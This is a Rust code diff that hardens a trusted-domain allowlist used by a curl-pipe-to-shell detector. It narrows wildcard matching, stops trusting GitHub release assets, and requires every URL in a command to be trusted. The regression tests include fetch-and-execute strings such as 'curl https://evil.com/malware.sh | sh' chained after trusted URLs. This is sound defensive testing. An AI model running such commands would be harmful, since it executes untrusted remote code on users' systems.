@@ -16,10 +16,10 @@ static DEFAULT_TRUSTED_DOMAINS: LazyLock<Vec<TrustedDomain>> = LazyLock::new(|| 
         TrustedDomain::exact("install.python-poetry.org"),
         TrustedDomain::exact("bootstrap.pypa.io"),
         // Package managers - Node.js
-        TrustedDomain::wildcard("raw.githubusercontent.com/nvm-sh/*"),
+        TrustedDomain::wildcard("raw.githubusercontent.com/nvm-sh/**"),
         TrustedDomain::exact("get.volta.sh"),
         // Package managers - Homebrew
-        TrustedDomain::wildcard("raw.githubusercontent.com/Homebrew/*"),
+        TrustedDomain::wildcard("raw.githubusercontent.com/Homebrew/**"),
         // Container tools
         TrustedDomain::exact("get.docker.com"),
         TrustedDomain::exact("get.docker.io"),
@@ -28,16 +28,18 @@ static DEFAULT_TRUSTED_DOMAINS: LazyLock<Vec<TrustedDomain>> = LazyLock::new(|| 
         TrustedDomain::exact("bun.sh"),
         // Cloud providers - AWS
         TrustedDomain::exact("awscli.amazonaws.com"),
-        TrustedDomain::wildcard("s3.amazonaws.com/aws-cli/*"),
+        TrustedDomain::wildcard("s3.amazonaws.com/aws-cli/**"),
         // Cloud providers - Google Cloud
         TrustedDomain::exact("packages.cloud.google.com"),
         TrustedDomain::exact("sdk.cloud.google.com"),
         TrustedDomain::exact("dl.google.com"),
         // Cloud providers - Azure
-        TrustedDomain::wildcard("aka.ms/*"),
-        // GitHub (official releases)
-        TrustedDomain::wildcard("github.com/*/releases/*"),
-        TrustedDomain::wildcard("objects.githubusercontent.com/*"),
+        TrustedDomain::wildcard("aka.ms/**"),
+        // NOTE: GitHub release assets (`github.com/*/releases/*`) and the
+        // release-asset CDN (`objects.githubusercontent.com/*`) are intentionally
+        // NOT trusted: those files are user-uploaded and attacker-controllable, so
+        // wildcard-trusting them would let `curl <attacker-release> | sh` bypass
+        // SC-001 (issue #158). Trust specific vendor orgs via custom domains instead.
         // HashiCorp
         TrustedDomain::exact("releases.hashicorp.com"),
         TrustedDomain::exact("apt.releases.hashicorp.com"),
@@ -73,9 +75,12 @@ impl TrustedDomain {
 
     /// Create a wildcard domain pattern.
     /// Wildcards:
-    /// - `*` matches any characters (non-greedy)
+    /// - `*` matches any characters **within a single path segment** (it does
+    ///   not cross `/` boundaries)
+    /// - `**` matches any characters **including `/`** (deep-path trust)
     /// - `*.example.com` matches subdomains
-    /// - `example.com/*` matches paths
+    /// - `example.com/*` matches one path segment; `example.com/**` matches any
+    ///   sub-path
     pub fn wildcard(pattern: &str) -> Self {
         let regex_pattern = Self::pattern_to_regex(pattern);
         Self {
@@ -86,11 +91,36 @@ impl TrustedDomain {
     }
 
     /// Convert a wildcard pattern to a regex pattern.
+    ///
+    /// A single `*` is translated to `[^/]*` so it stays within one path
+    /// segment, while `**` becomes `.*` to cross `/` boundaries. This prevents a
+    /// path wildcard from greedily matching across segments — e.g.
+    /// `github.com/*/releases/*` must not match a `/blob/main/releases/` URL
+    /// (issue #158).
     fn pattern_to_regex(pattern: &str) -> String {
-        let escaped = regex::escape(pattern);
-        // Replace escaped \* with .* for wildcard matching
-        let regex_str = escaped.replace(r"\*", ".*");
-        format!("^{}$", regex_str)
+        let mut regex_str = String::with_capacity(pattern.len() + 8);
+        regex_str.push('^');
+
+        let mut chars = pattern.chars().peekable();
+        while let Some(c) = chars.next() {
+            if c == '*' {
+                if chars.peek() == Some(&'*') {
+                    // `**` -> cross path segments.
+                    chars.next();
+                    regex_str.push_str(".*");
+                } else {
+                    // `*` -> stay within a single path segment.
+                    regex_str.push_str("[^/]*");
+                }
+            } else {
+                // Escape a single character so regex metacharacters stay literal.
+                let mut buf = [0u8; 4];
+                regex_str.push_str(&regex::escape(c.encode_utf8(&mut buf)));
+            }
+        }
+
+        regex_str.push('$');
+        regex_str
     }
 
     /// Check if the given URL matches this trusted domain.
@@ -189,22 +219,39 @@ impl TrustedDomainMatcher {
         false
     }
 
+    /// Compiled pattern that matches every URL-like token in a command.
+    fn url_pattern() -> &'static Regex {
+        static URL_PATTERN: LazyLock<Regex> =
+            LazyLock::new(|| Regex::new(r#"https?://[^\s'"<>]+"#).unwrap());
+        &URL_PATTERN
+    }
+
     /// Extract URL from a command string.
     /// Returns the first URL-like pattern found.
     pub fn extract_url(command: &str) -> Option<String> {
-        static URL_PATTERN: LazyLock<Regex> =
-            LazyLock::new(|| Regex::new(r#"https?://[^\s'"<>]+"#).unwrap());
+        Self::url_pattern()
+            .find(command)
+            .map(|m| m.as_str().to_string())
+    }
 
-        URL_PATTERN.find(command).map(|m| m.as_str().to_string())
+    /// Extract **all** URL-like patterns from a command string, in order.
+    pub fn extract_all_urls(command: &str) -> Vec<String> {
+        Self::url_pattern()
+            .find_iter(command)
+            .map(|m| m.as_str().to_string())
+            .collect()
     }
 
     /// Check if a command uses a trusted domain.
+    ///
+    /// Returns `true` only when the command contains at least one URL and
+    /// **every** URL is from a trusted domain. A single trusted URL must not
+    /// vouch for other untrusted URLs on the same command line — otherwise
+    /// `curl <trusted> | sh; curl <evil> | sh` would be exempted as a whole
+    /// (issue #158).
     pub fn command_uses_trusted_domain(&self, command: &str) -> bool {
-        if let Some(url) = Self::extract_url(command) {
-            self.is_trusted(&url)
-        } else {
-            false
-        }
+        let urls = Self::extract_all_urls(command);
+        !urls.is_empty() && urls.iter().all(|url| self.is_trusted(url))
     }
 
     /// Get the list of default trusted domains.
@@ -242,7 +289,8 @@ mod tests {
 
     #[test]
     fn test_wildcard_path() {
-        let domain = TrustedDomain::wildcard("raw.githubusercontent.com/Homebrew/*");
+        // `**` trusts any deep path under a specific org.
+        let domain = TrustedDomain::wildcard("raw.githubusercontent.com/Homebrew/**");
         assert!(
             domain.matches("https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh")
         );
@@ -251,9 +299,13 @@ mod tests {
     }
 
     #[test]
-    fn test_wildcard_github_releases() {
+    fn test_wildcard_single_segment_semantics() {
+        // A single `*` matches exactly one path segment and must not span `/`.
         let domain = TrustedDomain::wildcard("github.com/*/releases/*");
-        assert!(domain.matches("https://github.com/user/repo/releases/download/v1.0/binary"));
+        assert!(domain.matches("https://github.com/user/releases/binary"));
+        // `user/repo` is two segments before `/releases/`, so a segment-scoped
+        // `*` correctly refuses to match (issue #158 greedy-crossing fix).
+        assert!(!domain.matches("https://github.com/user/repo/releases/download/v1.0/binary"));
         assert!(!domain.matches("https://github.com/user/repo/blob/main/evil.sh"));
     }
 
@@ -342,5 +394,67 @@ mod tests {
 
         matcher.set_use_defaults(true);
         assert!(matcher.is_trusted("https://sh.rustup.rs"));
+    }
+
+    // ===== Regression tests for issue #158 =====
+
+    #[test]
+    fn test_extract_all_urls_returns_every_url() {
+        let urls = TrustedDomainMatcher::extract_all_urls(
+            "curl https://a.com/x | sh; curl https://b.com/y | sh",
+        );
+        assert_eq!(
+            urls,
+            vec!["https://a.com/x".to_string(), "https://b.com/y".to_string()]
+        );
+        assert!(TrustedDomainMatcher::extract_all_urls("echo no url here").is_empty());
+    }
+
+    #[test]
+    fn test_command_trusted_only_when_every_url_is_trusted() {
+        let matcher = TrustedDomainMatcher::new();
+        // All URLs trusted -> exempt.
+        assert!(matcher.command_uses_trusted_domain(
+            "curl https://sh.rustup.rs | sh; curl https://get.docker.com | sh"
+        ));
+        // First trusted, second untrusted -> must NOT be exempt (issue #158, bypass B).
+        assert!(!matcher.command_uses_trusted_domain(
+            "curl https://sh.rustup.rs/x | sh; curl https://evil.com/malware.sh | sh"
+        ));
+        // First untrusted, second trusted -> must NOT be exempt.
+        assert!(!matcher.command_uses_trusted_domain(
+            "curl https://evil.com/malware.sh | sh; curl https://sh.rustup.rs | sh"
+        ));
+        // No URL at all -> not a trusted-domain command.
+        assert!(!matcher.command_uses_trusted_domain("echo hello"));
+    }
+
+    #[test]
+    fn test_github_release_assets_not_trusted_by_default() {
+        // GitHub release assets and the release-asset CDN host user-uploaded,
+        // attacker-controllable files; they must not be wildcard-trusted (issue #158).
+        let matcher = TrustedDomainMatcher::new();
+        assert!(
+            !matcher.is_trusted("https://github.com/attacker/repo/releases/download/v1/malware.sh")
+        );
+        assert!(!matcher.is_trusted("https://objects.githubusercontent.com/attacker/malware.sh"));
+    }
+
+    #[test]
+    fn test_wildcard_single_star_does_not_cross_path_segments() {
+        // A single `*` matches within one path segment only (issue #158);
+        // it must not greedily cross `/` boundaries.
+        let domain = TrustedDomain::wildcard("example.com/*/safe");
+        assert!(domain.matches("https://example.com/foo/safe"));
+        assert!(!domain.matches("https://example.com/foo/bar/safe"));
+    }
+
+    #[test]
+    fn test_wildcard_double_star_crosses_path_segments() {
+        // `**` explicitly crosses `/` boundaries for deep-path trust.
+        let domain = TrustedDomain::wildcard("example.com/pkg/**");
+        assert!(domain.matches("https://example.com/pkg/a/b/c/install.sh"));
+        assert!(domain.matches("https://example.com/pkg/one"));
+        assert!(!domain.matches("https://example.com/other/thing"));
     }
 }
